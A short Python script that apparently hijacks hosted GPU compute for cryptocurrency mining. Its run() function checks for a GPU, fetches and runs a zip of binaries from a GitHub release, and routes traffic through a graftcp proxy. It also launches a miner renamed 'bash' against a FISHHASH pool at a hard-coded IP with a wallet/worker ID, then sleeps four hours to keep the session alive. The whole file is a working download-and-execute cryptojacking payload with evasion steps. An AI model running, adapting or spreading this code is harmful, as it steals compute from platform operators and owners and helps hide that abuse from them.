import subprocess
import time

def run():
    print("=== CHECK GPU ===")
    subprocess.run(["nvidia-smi"], check=False)

    cmd = """
    set -e

    apt update -y
    apt install -y wget unzip git

    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
    unzip -o pan.zip

    cd pan
    chmod -R +x .

    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    sleep 3

    git clone https://github.com/hujisanda/lol198.git
    cd lol198 && chmod u+x bash

    mv bash ~/pan

    cd ~/pan
    ./graftcp/graftcp ./bash --algo FISHHASH --pool 159.89.33.226:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX
    """

    try:
        subprocess.run(["bash", "-lc", cmd], check=True)
    except subprocess.CalledProcessError as e:
        print("ERROR:", e)

    print("=== KEEP ALIVE 4 JAM ===")
    time.sleep(60 * 60 * 4)

    return {"status": "done"}
